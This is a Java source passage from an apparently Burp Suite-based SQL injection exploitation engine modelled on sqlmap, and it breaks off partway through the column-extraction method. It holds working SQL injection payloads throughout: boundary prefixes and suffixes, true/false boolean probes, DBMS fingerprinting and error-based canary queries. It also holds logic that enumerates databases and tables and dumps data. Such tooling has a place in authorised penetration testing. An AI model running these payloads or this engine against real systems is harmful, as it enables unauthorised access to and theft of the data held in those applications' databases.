package com.omnistrike.framework.omnimap;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.HttpRequestResponse;
import burp.api.montoya.http.message.requests.HttpRequest;
import com.omnistrike.framework.omnimap.dbms.DbmsDetector;
import com.omnistrike.framework.omnimap.dbms.DbmsDialect;
import com.omnistrike.framework.omnimap.tamper.TamperEngine;
import com.omnistrike.framework.omnimap.technique.*;

import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.ThreadLocalRandom;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * OmniMap Engine — high-speed SQL injection exploitation orchestrator.
 * A sqlmap variant built into OmniStrike with parallel extraction,
 * adaptive bisection, and predictive optimization.
 *
 * Pipeline:
 * 1. DBMS detection (auto-detect from errors or user-specified)
 * 2. Technique selection (test which work, rank by speed: UNION > Boolean)
 * 3. Data extraction (databases/tables/columns/dump based on action)
 * 4. Real-time progress callbacks to UI panel
 */
public class OmniMapEngine {

    private final MontoyaApi api;
    private volatile boolean cancelled = false;
    private ExecutorService enginePool;

    // Active extractors (for cancellation)
    private volatile UnionExtractor unionExtractor;
    private volatile BlindExtractor blindExtractor;

    public OmniMapEngine(MontoyaApi api) {
        this.api = api;
    }

    /**
     * Main exploitation entry point. Runs asynchronously on a background thread.
     */
    public void exploit(HttpRequestResponse request, OmniMapConfig config, OmniMapCallback callback) {
        cancelled = false;

        // Shut down previous pool if still running (prevents thread pool leak on rapid re-exploit)
        if (enginePool != null && !enginePool.isShutdown()) {
            enginePool.shutdownNow();
        }

        // Reset stale extractors from any previous run
        unionExtractor = null;
        blindExtractor = null;

        enginePool = Executors.newFixedThreadPool(config.getThreads());

        enginePool.submit(() -> {
            OmniMapResult result = new OmniMapResult();
            result.setStartTime(System.currentTimeMillis());

            try {
                callback.onProgress("OmniMap v3 (build 20260228a) — level=" + config.getLevel() +
                        " risk=" + config.getRisk() + " threads=" + config.getThreads() +
                        " prefix=\"" + config.getPrefix() +
                        "\" suffix=\"" + config.getSuffix() + "\"" +
                        " techniques=" + config.getTechniques() +
                        " action=" + config.getAction() +
                        " dbms=" + config.getDbms(), 0);

                // Track whether the user manually specified a boundary
                boolean userSpecifiedBoundary = !config.getPrefix().isEmpty() || !config.getSuffix().isEmpty();
                callback.onProgress("userSpecifiedBoundary=" + userSpecifiedBoundary, 1);

                // Step 1: Boundary Detection FIRST (DBMS-agnostic)
                // We need the boundary before DBMS detection so we can use boolean-based
                // fingerprinting when error-based detection fails (e.g., blind SQLi labs)
                if (!userSpecifiedBoundary) {
                    detectBoundary(request, config, callback, result);
                }

                // Step 2: DBMS Detection (can now use boolean-based with the working boundary)
                DbmsDialect dialect = detectDbms(request, config, callback, result);
                if (dialect == null || cancelled) {
                    callback.onError("Failed to detect DBMS. Try specifying it manually.");
                    return;
                }

                result.setDbms(dialect.getName());
                callback.onDbmsDetected(dialect.getName());

                // Always generate ALL candidate boundaries based on level/risk.
                // Like sqlmap: each technique tries ALL boundaries independently.
                // This ensures that if boundary X works for boolean but not error-based,
                // error-based can still succeed with boundary Y.
                // User-specified or auto-detected boundary goes FIRST for priority,
                // but all level/risk-based alternatives are still tried.
                List<String[]> boundaries = generateBoundaries(config.getLevel(), config.getRisk());
                String dp = config.getPrefix();
                String ds = config.getSuffix();
                if (!dp.isEmpty() || !ds.isEmpty()) {
                    // Move user/auto-detected boundary to front (remove duplicate if exists)
                    boundaries.removeIf(b -> b[0].equals(dp) && b[1].equals(ds));
                    boundaries.add(0, new String[]{dp, ds});
                }

                callback.onProgress("Generated " + boundaries.size() + " boundaries for technique detection" +
                        " (level=" + config.getLevel() + " risk=" + config.getRisk() +
                        " userSpecified=" + userSpecifiedBoundary + ")", 11);

                // Step 3: Technique Selection — test which techniques work with ALL boundaries
                String bestTechnique = selectTechnique(request, config, dialect, callback, result, boundaries);
                if (bestTechnique == null || cancelled) {
                    callback.onError("No working exploitation technique found. " +
                            "The parameter may not be injectable or requires different settings.");
                    return;
                }

                result.setTechnique(bestTechnique);

                callback.onProgress("Using technique: " + bestTechnique, 20);

                // Step 3: Data Extraction based on action
                switch (config.getAction()) {
                    case "databases" -> extractDatabases(config, dialect, callback, result, request);
                    case "tables" -> extractTables(config, dialect, callback, result, request);
                    case "columns" -> extractColumns(config, dialect, callback, result, request);
                    case "dump" -> dumpData(config, dialect, callback, result, request);
                    default -> extractDatabases(config, dialect, callback, result, request);
                }

                // Complete
                result.setElapsedMs(System.currentTimeMillis() - result.getStartTime());
                callback.onProgress("Extraction complete! " + result.getRequestCount() + " requests in " +
                        (result.getElapsedMs() / 1000) + "s", 100);
                callback.onComplete(result);

            } catch (Exception e) {
                callback.onError("Engine error: " + e.getMessage());
            }
        });
    }

    /**
     * Stop all running extraction.
     */
    public void stop() {
        cancelled = true;
        if (unionExtractor != null) unionExtractor.cancel();
        if (blindExtractor != null) blindExtractor.cancel();
        if (enginePool != null) {
            enginePool.shutdownNow();
        }
    }

    // ==================== Boundary Generation ====================

    /**
     * Generate ALL candidate injection boundaries based on level and risk.
     * Like sqlmap's boundaries.xml: each boundary is a {prefix, suffix} pair.
     *
     * Two types:
     * 1. COMMENT-BASED: suffix is a SQL comment (-- -, #) that kills the trailing quote
     *    Example: ' AND 1=1 -- -   → WHERE id='xyz' AND 1=1 -- -'
     * 2. SELF-CLOSING: suffix re-closes the original quote so the query stays valid
     *    Example: ' AND '1'='1     → WHERE id='xyz' AND '1'='1'
     *    Critical for cookie-based injection where comments may not work!
     *
     * Level controls how many boundaries: L1=6, L2=12, L3=18, L4=24+, L5=all
     * Risk 3 adds OR-based self-closing boundaries
     */
    static List<String[]> generateBoundaries(int level, int risk) {
        int ri = ThreadLocalRandom.current().nextInt(1000, 10000);
        List<String[]> boundaryList = new ArrayList<>();

        // ===== Level 1: most common =====
        boundaryList.add(new String[]{"'", "-- -"});                                  // Single quote + universal comment
        boundaryList.add(new String[]{"'", "#"});                                     // Single quote + MySQL comment
        boundaryList.add(new String[]{"'", "AND '" + ri + "'='" + ri});               // Self-closing single quote (cookie injection!)
        boundaryList.add(new String[]{"\"", "-- -"});                                 // Double quote + comment
        boundaryList.add(new String[]{"", "-- -"});                                   // Numeric (no quote needed)
        boundaryList.add(new String[]{"", "AND " + ri + "=" + ri});                   // Numeric self-closing
        boundaryList.add(new String[]{"'", ""});                                      // Single quote, NO suffix (let error function close it)
        boundaryList.add(new String[]{"", ""});                                       // Numeric, NO suffix

        // ===== Level 2 =====
        if (level >= 2) {
            boundaryList.add(new String[]{"')", "-- -"});                             // Close paren + comment
            boundaryList.add(new String[]{"')", "#"});
            boundaryList.add(new String[]{"')", ""});                                 // Close paren, no suffix
            boundaryList.add(new String[]{"\")", "-- -"});
            boundaryList.add(new String[]{"", "#"});
            boundaryList.add(new String[]{"\"", "AND \"" + ri + "\"=\"" + ri});       // Self-closing double quote
            boundaryList.add(new String[]{"\"", ""});                                 // Double quote, no suffix
            boundaryList.add(new String[]{"')", "AND ('" + ri + "')=('" + ri});       // Self-closing with parens
        }

        // ===== Level 3+: hash comment suffix + NOT-based =====
        if (level >= 3) {
            boundaryList.add(new String[]{"'))", "-- -"});
            boundaryList.add(new String[]{"\"))", "-- -"});
            boundaryList.add(new String[]{"'))", ""});                                // Double close paren, no suffix
            boundaryList.add(new String[]{"' ", "-- -"});                             // Space after quote
            boundaryList.add(new String[]{"') ", "-- -"});
            boundaryList.add(new String[]{"'))", "#"});                               // Hash comment with double paren
            boundaryList.add(new String[]{"\"))", "#"});
        }

        // ===== Level 4+: WHERE injection + exotic =====
        if (level >= 4) {
            boundaryList.add(new String[]{"')))", "-- -"});
            boundaryList.add(new String[]{"')))", ""});
            boundaryList.add(new String[]{"%27", "-- -"});                            // URL-encoded quote
            boundaryList.add(new String[]{"'/*", "*/-- -"});                          // Inline comment
            // WHERE injection boundaries
            boundaryList.add(new String[]{"') WHERE " + ri + "=" + ri + " -- -", ""});
            boundaryList.add(new String[]{"' WHERE " + ri + "=" + ri + " -- -", ""});
        }

        // ===== Level 5: everything =====
        if (level >= 5) {
            boundaryList.add(new String[]{"'))))", "-- -"});
            boundaryList.add(new String[]{"')))", "#"});
            boundaryList.add(new String[]{"' OR '" + ri + "'='" + ri + "' -- -", ""});
        }

        // ===== Risk 3: OR-based self-closing boundaries (dangerous for UPDATE/DELETE!) =====
        if (risk >= 3) {
            boundaryList.add(new String[]{"' OR '" + ri + "'='" + ri, ""});           // OR self-closing single quote
            boundaryList.add(new String[]{"\" OR \"" + ri + "\"=\"" + ri, ""});       // OR self-closing double quote
            boundaryList.add(new String[]{"", "OR " + ri + "=" + ri});                // OR numeric self-closing
        }

        return boundaryList;
    }

    // ==================== Boundary Detection ====================

    /**
     * Auto-detect a working injection boundary for DBMS fingerprinting.
     * Finds the first boundary where AND true / AND false produce different responses.
     * Auto-detects a distinguishing string (like sqlmap's --string).
     * Note: each technique ALSO tries all boundaries independently during its own detect().
     */
    private void detectBoundary(HttpRequestResponse request, OmniMapConfig config,
                                 OmniMapCallback callback, OmniMapResult result) {
        callback.onProgress("Auto-detecting injection boundary...", 10);

        List<String[]> boundaryList = generateBoundaries(config.getLevel(), config.getRisk());
        String[][] boundaries = boundaryList.toArray(new String[0][]);
        int maxTries = boundaries.length;

        ResponseAnalyzer analyzer = new ResponseAnalyzer();

        // sqlmap uses random integers for AND conditions, not static 1=1/1=2
        int randInt = ThreadLocalRandom.current().nextInt(1000, 10000);

        for (int i = 0; i < Math.min(maxTries, boundaries.length) && !cancelled; i++) {
            String prefix = boundaries[i][0];
            String suffix = boundaries[i][1];

            try {
                // Test true condition: prefix + AND randInt=randInt + suffix
                String truePayload = prefix + " AND " + randInt + "=" + randInt + " " + suffix;
                truePayload = TamperEngine.apply(truePayload, config.getTampers());
                HttpRequest trueReq = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(), truePayload);
                long s1 = System.currentTimeMillis();
                HttpRequestResponse trueRr = api.http().sendRequest(trueReq);
                long e1 = System.currentTimeMillis() - s1;
                result.incrementRequestCount();
                callback.onRequestSent(trueRr, prefix + " AND " + randInt + "=" + randInt + " " + suffix, "BOUNDARY", e1);

                // Test false condition: prefix + AND randInt=randInt+1 + suffix
                String falsePayload = prefix + " AND " + randInt + "=" + (randInt + 1) + " " + suffix;
                falsePayload = TamperEngine.apply(falsePayload, config.getTampers());
                HttpRequest falseReq = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(), falsePayload);
                long s2 = System.currentTimeMillis();
                HttpRequestResponse falseRr = api.http().sendRequest(falseReq);
                long e2 = System.currentTimeMillis() - s2;
                result.incrementRequestCount();
                callback.onRequestSent(falseRr, prefix + " AND " + randInt + "=" + (randInt + 1) + " " + suffix, "BOUNDARY", e2);

                if (trueRr.response() != null && falseRr.response() != null) {
                    String trueBody = trueRr.response().bodyToString();
                    String falseBody = falseRr.response().bodyToString();
                    if (trueBody == null) trueBody = "";
                    if (falseBody == null) falseBody = "";

                    // Signal 1: Status code difference (strong)
                    int trueStatus = trueRr.response().statusCode();
                    int falseStatus = falseRr.response().statusCode();
                    boolean statusDiffers = trueStatus != falseStatus;

                    // Signal 2: Content-length difference
                    int lenDiff = Math.abs(trueBody.length() - falseBody.length());

                    // Signal 3: Body similarity ratio
                    double similarity = analyzer.similarity(trueBody, falseBody);

                    // Signal 4: String-level diff — catches subtle diffs like "Welcome back"
                    // in large pages where overall similarity is 0.99+ but a specific
                    // text exists in true response and not in false response
                    String autoTrueString = analyzer.autoDetectTrueString(trueBody, falseBody);
                    boolean stringDiffers = autoTrueString != null && !autoTrueString.isEmpty();

                    // Boundary works if ANY signal shows a difference
                    if (similarity < 0.98 || statusDiffers || stringDiffers || lenDiff > 20) {
                        config.setPrefix(prefix);
                        config.setSuffix(suffix);
                        callback.onProgress("Boundary detected: prefix=\"" + prefix +
                                "\" suffix=\"" + suffix + "\" (sim=" +
                                String.format("%.3f", similarity) +
                                ", status=" + trueStatus + "/" + falseStatus +
                                ", lenDiff=" + lenDiff +
                                (stringDiffers ? ", marker=\"" + autoTrueString + "\"" : "") + ")", 15);

                        // Set auto-detected string for boolean comparison
                        if (stringDiffers && config.getTrueString().isEmpty()) {
                            config.setTrueString(autoTrueString);
                            callback.onProgress("Auto-detected true marker: \"" + autoTrueString + "\"", 16);
                        }

                        return;
                    }
                }
            } catch (Exception e) {
                // Continue with next boundary
            }
        }

        // Fallback: use single quote + universal comment
        config.setPrefix("'");
        config.setSuffix("-- -");
        callback.onProgress("Boundary: defaulting to ' ... -- -", 15);
    }

    // ==================== DBMS Detection ====================

    private DbmsDialect detectDbms(HttpRequestResponse request, OmniMapConfig config,
                                    OmniMapCallback callback, OmniMapResult result) {
        // User-specified DBMS
        if (config.getDbms() != null && !config.getDbms().isEmpty() && !"Auto-detect".equals(config.getDbms())) {
            callback.onProgress("Using specified DBMS: " + config.getDbms(), 5);
            return DbmsDetector.getDialect(config.getDbms());
        }

        callback.onProgress("Auto-detecting DBMS...", 3);

        // Strategy 1: Error-based detection — inject error-triggering payloads RAW.
        // These are standalone probes designed to cause SQL syntax errors.
        // Must NOT be wrapped with boundary prefix/suffix — e.g., wrapping ' with
        // prefix ' gives '' (escaped quote = valid SQL, no error!).
        // For each probe, try: RAW, then with prefix only, then with prefix+suffix.
        // Also tracks HTTP status codes — 500/400 confirms error-triggering even
        // if the response body doesn't contain DBMS-specific error patterns.
        String[] errorPayloads = {"'", "\"", "1'", "1\"", "' OR '1'='1", "1 AND 1=CONVERT(int,@@version)"};
        String prefix = config.getPrefix();
        String suffix = config.getSuffix();
        boolean gotErrorStatus = false;  // Track if any probe triggered HTTP 4xx/5xx

        for (String errPayload : errorPayloads) {
            if (cancelled) return null;

            // Try the payload in 3 forms: RAW, prefix-only, prefix+suffix
            String[][] variants = {
                    {errPayload, "raw"},
                    {prefix + errPayload, "prefix-only"},
                    {prefix + errPayload + (suffix.isEmpty() ? "" : suffix), "prefix+suffix"}
            };

            for (String[] variant : variants) {
                if (cancelled) return null;
                try {
                    String payload = TamperEngine.apply(variant[0], config.getTampers());
                    HttpRequest req = PayloadInjector.inject(request.request(),
                            config.getParameterName(), config.getParameterType(), payload);
                    long start = System.currentTimeMillis();
                    HttpRequestResponse rr = api.http().sendRequest(req);
                    long elapsed = System.currentTimeMillis() - start;
                    result.incrementRequestCount();
                    int statusCode = rr.response() != null ? rr.response().statusCode() : 0;
                    callback.onRequestSent(rr, errPayload + " [" + variant[1] + "] status=" + statusCode, "DETECT", elapsed);

                    // Track error status codes (500, 400, etc.)
                    if (statusCode >= 400) {
                        gotErrorStatus = true;
                    }

                    if (rr.response() != null) {
                        String body = rr.response().bodyToString();
                        DbmsDialect detected = DbmsDetector.detectFromResponse(body);
                        if (detected != null) {
                            callback.onProgress("DBMS detected: " + detected.getName() +
                                    " (error fingerprint via " + variant[1] + ": " + errPayload +
                                    " status=" + statusCode + ")", 8);
                            return detected;
                        }
                    }
                } catch (Exception e) {
                    // Continue with next variant
                }
            }
        }

        if (gotErrorStatus) {
            callback.onProgress("DBMS: Error probes triggered HTTP 4xx/5xx but no DBMS pattern matched. " +
                    "Trying boolean fingerprinting...", 4);
        }

        // Strategy 2: Boolean-based DBMS fingerprinting
        // Uses the boundary detected in Step 1 to test DBMS-specific functions.
        // Each function is unique to its DBMS — if it evaluates successfully (true page),
        // we've identified the backend. This is critical for blind SQLi where no error
        // messages are returned.
        if (!config.getPrefix().isEmpty() || !config.getSuffix().isEmpty()) {
            callback.onProgress("DBMS: Boolean-based fingerprinting...", 5);

            // First, get a true baseline using the detected boundary
            ResponseAnalyzer analyzer = new ResponseAnalyzer();
            if (!config.getTrueString().isEmpty()) analyzer.setTrueString(config.getTrueString());
            if (!config.getFalseString().isEmpty()) analyzer.setFalseString(config.getFalseString());

            String trueBaseline = null;
            String falseBaseline = null;

            // Random integers for true/false conditions (like sqlmap)
            int dbmsRand = ThreadLocalRandom.current().nextInt(1000, 10000);

            try {
                // Baseline true: prefix + AND randInt=randInt + suffix
                String trueP = config.getPrefix() + " AND " + dbmsRand + "=" + dbmsRand + " " + config.getSuffix();
                trueP = TamperEngine.apply(trueP, config.getTampers());
                HttpRequest trueReq = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(), trueP);
                long s1 = System.currentTimeMillis();
                HttpRequestResponse trueRr = api.http().sendRequest(trueReq);
                long e1 = System.currentTimeMillis() - s1;
                result.incrementRequestCount();
                callback.onRequestSent(trueRr, "AND " + dbmsRand + "=" + dbmsRand + " (DBMS baseline)", "DETECT", e1);
                if (trueRr.response() != null) {
                    trueBaseline = trueRr.response().bodyToString();
                    analyzer.setTrueStatusCode(trueRr.response().statusCode());
                }

                // Baseline false: prefix + AND randInt=randInt+1 + suffix
                String falseP = config.getPrefix() + " AND " + dbmsRand + "=" + (dbmsRand + 1) + " " + config.getSuffix();
                falseP = TamperEngine.apply(falseP, config.getTampers());
                HttpRequest falseReq = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(), falseP);
                long s2 = System.currentTimeMillis();
                HttpRequestResponse falseRr = api.http().sendRequest(falseReq);
                long e2 = System.currentTimeMillis() - s2;
                result.incrementRequestCount();
                callback.onRequestSent(falseRr, "AND " + dbmsRand + "=" + (dbmsRand + 1) + " (DBMS baseline)", "DETECT", e2);
                if (falseRr.response() != null) {
                    falseBaseline = falseRr.response().bodyToString();
                    analyzer.setFalseStatusCode(falseRr.response().statusCode());
                }
            } catch (Exception e) {
                // Continue without baselines
            }

            if (trueBaseline != null && falseBaseline != null) {
                // DBMS-specific boolean fingerprints: unique functions that only exist on one DBMS
                // If the function exists → query succeeds → true page
                // If the function doesn't exist → SQL error → false/error page
                String[][] fingerprints = {
                        {"PostgreSQL", "PG_BACKEND_PID()>0"},       // PG_BACKEND_PID() is PostgreSQL-only
                        {"MySQL", "CONNECTION_ID()>0"},             // CONNECTION_ID() is MySQL-only
                        {"MSSQL", "@@SPID>0"},                      // @@SPID is MSSQL-only
                        {"Oracle", "BITAND(1,1)=1"},                // BITAND() is Oracle-only
                        {"SQLite", "SQLITE_VERSION() IS NOT NULL"}, // SQLITE_VERSION() is SQLite-only
                };

                // Collect status codes for fallback status-code-based detection
                int trueBaselineStatus = analyzer.getTrueStatusCode();
                Map<String, Integer> fingerprintStatuses = new LinkedHashMap<>();

                for (String[] fp : fingerprints) {
                    if (cancelled) return null;
                    String dbmsName = fp[0];
                    String condition = fp[1];

                    try {
                        String testPayload = config.getPrefix() + " AND " + condition + " " + config.getSuffix();
                        testPayload = TamperEngine.apply(testPayload, config.getTampers());
                        HttpRequest testReq = PayloadInjector.inject(request.request(),
                                config.getParameterName(), config.getParameterType(), testPayload);
                        long s3 = System.currentTimeMillis();
                        HttpRequestResponse testRr = api.http().sendRequest(testReq);
                        long e3 = System.currentTimeMillis() - s3;
                        result.incrementRequestCount();
                        callback.onRequestSent(testRr, dbmsName + ": " + condition, "DETECT", e3);

                        if (testRr.response() != null) {
                            String testBody = testRr.response().bodyToString();
                            int testStatus = testRr.response().statusCode();
                            fingerprintStatuses.put(dbmsName, testStatus);

                            // Strategy 2a: content-based — check if response matches "true" baseline
                            boolean isTrue = analyzer.isTruePage(trueBaseline, falseBaseline, testBody, testStatus);
                            if (isTrue) {
                                callback.onProgress("DBMS detected: " + dbmsName + " (boolean fingerprint: " + condition + ")", 8);
                                return DbmsDetector.getDialect(dbmsName);
                            }
                        }
                    } catch (Exception e) {
                        // Continue with next DBMS
                    }
                }

                // Strategy 2b: Status-code-based fallback.
                // When content-based isTruePage fails (e.g. both baselines return 200 and content
                // comparison is unreliable), use raw HTTP status codes:
                // The correct DBMS fingerprint returns 200 (function exists → valid SQL),
                // while wrong DBMS fingerprints return 500 (function doesn't exist → SQL error).
                // If exactly ONE fingerprint returned 200 and all others returned 500, that's the DBMS.
                if (!fingerprintStatuses.isEmpty()) {
                    List<String> successDbms = new ArrayList<>();
                    List<String> errorDbms = new ArrayList<>();

                    for (Map.Entry<String, Integer> entry : fingerprintStatuses.entrySet()) {
                        int status = entry.getValue();
                        if (status >= 200 && status < 400) {
                            successDbms.add(entry.getKey());
                        } else {
                            errorDbms.add(entry.getKey());
                        }
                    }

                    // If exactly one DBMS returned success and at least one returned error,
                    // we have a clear winner
                    if (successDbms.size() == 1 && !errorDbms.isEmpty()) {
                        String detected = successDbms.get(0);
                        callback.onProgress("DBMS detected: " + detected +
                                " (status-code fingerprint: 200 vs " + errorDbms.size() + "x error)", 8);
                        return DbmsDetector.getDialect(detected);
                    }

                    // If multiple returned success but one matches true baseline status exactly
                    // and the others don't, use that
                    if (successDbms.size() > 1 && trueBaselineStatus > 0) {
                        List<String> exactMatch = new ArrayList<>();
                        for (String dbms : successDbms) {
                            if (fingerprintStatuses.get(dbms) == trueBaselineStatus) {
                                exactMatch.add(dbms);
                            }
                        }
                        if (exactMatch.size() == 1) {
                            String detected = exactMatch.get(0);
                            callback.onProgress("DBMS detected: " + detected +
                                    " (exact status match: " + trueBaselineStatus + ")", 8);
                            return DbmsDetector.getDialect(detected);
                        }
                    }
                }
            }
        }

        // Strategy 3: Error-based canary probes — one lightweight probe per DBMS.
        // Each injects the string "omni" via that DBMS's native error function.
        // First DBMS where the canary appears in the (HTML-stripped) response body wins.
        // This avoids the old "default to MySQL" which would run 826+ wrong-DBMS combos.
        callback.onProgress("DBMS: Trying error-based canary probes...", 6);

        String[][] canaryProbes = {
                {"PostgreSQL", "AND 1=CAST((CHR(111)||CHR(109)||CHR(110)||CHR(105)) AS NUMERIC)"},
                {"MySQL",      "AND EXTRACTVALUE(1,CONCAT(0x7e,0x6f6d6e69))"},
                {"MSSQL",      "AND 1 IN (SELECT CONCAT(CHAR(111),CHAR(109),CHAR(110),CHAR(105)))"},
                {"Oracle",     "AND 1=UTL_INADDR.GET_HOST_ADDRESS(CHR(111)||CHR(109)||CHR(110)||CHR(105))"},
        };

        boolean anyCanaryStatusChange = false;
        // Get a baseline status code for comparison
        int baselineStatus = 0;
        try {
            String basePayload = TamperEngine.apply(prefix + " AND 1=1 " + suffix, config.getTampers());
            HttpRequest baseReq = PayloadInjector.inject(request.request(),
                    config.getParameterName(), config.getParameterType(), basePayload);
            HttpRequestResponse baseRr = api.http().sendRequest(baseReq);
            result.incrementRequestCount();
            if (baseRr.response() != null) baselineStatus = baseRr.response().statusCode();
        } catch (Exception ignored) {}

        for (String[] canary : canaryProbes) {
            if (cancelled) return null;
            String dbmsName = canary[0];
            String probe = canary[1];

            try {
                String canaryPayload = TamperEngine.apply(prefix + " " + probe + " " + suffix, config.getTampers());
                HttpRequest canaryReq = PayloadInjector.inject(request.request(),
                        config.getParameterName(), config.getParameterType(), canaryPayload);
                long cs = System.currentTimeMillis();
                HttpRequestResponse canaryRr = api.http().sendRequest(canaryReq);
                long ce = System.currentTimeMillis() - cs;
                result.incrementRequestCount();
                int canaryStatus = canaryRr.response() != null ? canaryRr.response().statusCode() : 0;
                callback.onRequestSent(canaryRr, dbmsName + " canary status=" + canaryStatus, "DETECT", ce);

                if (canaryStatus != baselineStatus && canaryStatus >= 400) {
                    anyCanaryStatusChange = true;
                }

                if (canaryRr.response() != null) {
                    // Strip HTML tags before checking for canary — same fix as Bug 2
                    String canaryBody = canaryRr.response().bodyToString();
                    if (canaryBody != null) {
                        canaryBody = canaryBody.replaceAll("<[^>]*>", " ").replaceAll("\\s+", " ");
                        if (canaryBody.contains("omni")) {
                            callback.onProgress("DBMS detected: " + dbmsName +
                                    " (error canary probe, status=" + canaryStatus + ")", 8);
                            return DbmsDetector.getDialect(dbmsName);
                        }
                    }
                }
            } catch (Exception e) {
                // Continue with next DBMS
            }
        }

        // Canary probes couldn't identify DBMS from error text.
        // If status changed, errors fire but output is suppressed — error-INFERENCE
        // mode can still use HTTP 500 vs 200 as a boolean oracle. Don't remove ERROR.
        if (anyCanaryStatusChange) {
            callback.onProgress("DBMS: Canary probes triggered errors but text suppressed. " +
                    "Error-inference mode will use status code as oracle.", 8);
        } else {
            callback.onProgress("DBMS: No canary matched. Defaulting to MySQL.", 8);
        }
        return DbmsDetector.getDialect("MySQL");
    }

    // ==================== Technique Selection ====================

    /**
     * Test which techniques work, trying ALL boundary combinations for each.
     * Each technique independently tries all boundaries × payloads.
     *
     * Testing order: Boolean > UNION
     * (Boolean is fastest to DETECT, UNION is slower because it requires finding column count.)
     *
     * Extraction preference: UNION > Boolean
     * (UNION is fastest to EXTRACT.)
     * The bestTechnique returned reflects extraction preference, not testing order.
     */
    private String selectTechnique(HttpRequestResponse request, OmniMapConfig config,
                                    DbmsDialect dialect, OmniMapCallback callback,
                                    OmniMapResult result, List<String[]> boundaries) {
        Set<Technique> enabled = config.getTechniques();
        int phaseStart = result.getRequestCount();

        // === Test 1: Boolean blind (fast to detect, slow to extract) ===
        if (enabled.contains(Technique.BOOLEAN) && !cancelled) {
            int before = result.getRequestCount();
            callback.onProgress("Testing Boolean blind injection (" + boundaries.size() + " boundaries)...", 15);
            BlindExtractor be = new BlindExtractor(api, config, dialect, callback, result, request);
            if (be.detect(boundaries)) {
                blindExtractor = be;
                callback.onProgress("BOOLEAN: DETECTED (" + (result.getRequestCount() - before) + " reqs)", 16);
            } else {
                callback.onProgress("BOOLEAN: NOT detected (" + (result.getRequestCount() - before) + " reqs)", 16);
            }
        }

        // === Test 2: UNION query (slower to detect — requires column count + display column) ===
        if (enabled.contains(Technique.UNION) && !cancelled) {
            int before = result.getRequestCount();
            callback.onProgress("Testing UNION query injection (" + boundaries.size() + " boundaries)...", 18);
            UnionExtractor ue = new UnionExtractor(api, config, dialect, callback, result, request);
            if (ue.detect(boundaries)) {
                unionExtractor = ue;
                callback.onProgress("UNION: DETECTED — " + ue.getColumnCount() + " columns, display col " +
                        (ue.getDisplayColumn() + 1) + " (" + (result.getRequestCount() - before) + " reqs)", 19);
            } else {
                callback.onProgress("UNION: NOT detected (" + (result.getRequestCount() - before) + " reqs)", 19);
            }
        }

        // === Determine best technique for EXTRACTION (preference: UNION > Boolean) ===
        String bestTechnique = null;
        if (unionExtractor != null) bestTechnique = "UNION";
        else if (blindExtractor != null) bestTechnique = "BOOLEAN";

        int totalPhaseReqs = result.getRequestCount() - phaseStart;
        if (bestTechnique != null) {
            StringBuilder detected = new StringBuilder();
            if (unionExtractor != null) detected.append("UNION ");
            if (blindExtractor != null) detected.append("BOOLEAN ");
            callback.onProgress("Detected techniques: " + detected.toString().trim() +
                    " | Using: " + bestTechnique +
                    " (" + totalPhaseReqs + " total detection reqs)", 19);
        } else {
            callback.onProgress("No techniques detected after " + totalPhaseReqs + " requests", 19);
        }

        return bestTechnique;
    }

    // ==================== Data Extraction ====================
    // All actions cascade like sqlmap:
    //   "databases" → list databases
    //   "tables"    → resolve DB → list tables
    //   "columns"   → resolve DB → resolve tables → list columns for each
    //   "dump"      → resolve DB → resolve tables → resolve columns → dump rows for each

    /**
     * Resolve the target database. Uses config value if set, otherwise extracts current DB.
     */
    private String resolveDatabase(OmniMapConfig config, DbmsDialect dialect,
                                    OmniMapCallback callback, OmniMapResult result,
                                    HttpRequestResponse request) {
        String db = config.getTargetDatabase();
        if (db != null && !db.isEmpty()) return db;

        callback.onProgress("Detecting current database...", 22);
        db = extractValue(dialect.currentDatabase(), config, dialect, callback, result, request);
        if (db != null && !db.isEmpty()) {
            callback.onProgress("Current database: " + db, 25);
        }
        return db;
    }

    /**
     * Resolve target tables. Uses config value if set, otherwise enumerates all tables.
     */
    private List<String> resolveTables(String targetDb, OmniMapConfig config, DbmsDialect dialect,
                                        OmniMapCallback callback, OmniMapResult result,
                                        HttpRequestResponse request) {
        String configTable = config.getTargetTable();
        if (configTable != null && !configTable.isEmpty()) {
            return List.of(configTable);
        }

        callback.onProgress("Enumerating tables in " + targetDb + "...", 28);
        List<String> tables = extractValues(dialect.listTables(targetDb), config, dialect, callback, result, request);
        if (tables != null && !tables.isEmpty()) {
            result.setTables(targetDb, tables);
            callback.onTablesFound(targetDb, tables);
            callback.onProgress("Found " + tables.size() + " table(s) in " + targetDb, 30);
        }
        return tables != null ? tables : new ArrayList<>();
    }

    private void extractDatabases(OmniMapConfig config, DbmsDialect dialect,
                                   OmniMapCallback callback, OmniMapResult result,
                                   HttpRequestResponse request) {
        callback.onProgress("Extracting databases...", 25);

        String currentDb = extractValue(dialect.currentDatabase(), config, dialect, callback, result, request);
        if (currentDb != null && !currentDb.isEmpty()) {
            callback.onProgress("Current database: " + currentDb, 30);
        }

        List<String> databases = extractValues(dialect.listDatabases(), config, dialect, callback, result, request);
        if (databases != null && !databases.isEmpty()) {
            if (currentDb != null && !databases.contains(currentDb)) {
                databases.add(0, currentDb);
            }
            result.setDatabases(databases);
            callback.onDatabasesFound(databases);
            callback.onProgress("Found " + databases.size() + " database(s)", 90);
        } else if (currentDb != null) {
            result.addDatabase(currentDb);
            callback.onDatabasesFound(List.of(currentDb));
        }
    }

    private void extractTables(OmniMapConfig config, DbmsDialect dialect,
                                OmniMapCallback callback, OmniMapResult result,
                                HttpRequestResponse request) {
        String targetDb = resolveDatabase(config, dialect, callback, result, request);
        if (targetDb == null || targetDb.isEmpty()) {
            callback.onError("Could not determine target database");
            return;
        }

        callback.onProgress("Extracting tables from " + targetDb + "...", 25);
        List<String> tables = extractValues(dialect.listTables(targetDb), config, dialect, callback, result, request);
        if (tables != null && !tables.isEmpty()) {
            result.setTables(targetDb, tables);
            callback.onTablesFound(targetDb, tables);
            callback.onProgress("Found " + tables.size() + " table(s) in " + targetDb, 90);
        }
    }

    private void extractColumns(OmniMapConfig config, DbmsDialect dialect,
                                 OmniMapCallback callback, OmniMapResult result,
                                 HttpRequestResponse request) {
        String targetDb = resolveDatabase(config, dialect, callback, result, request);
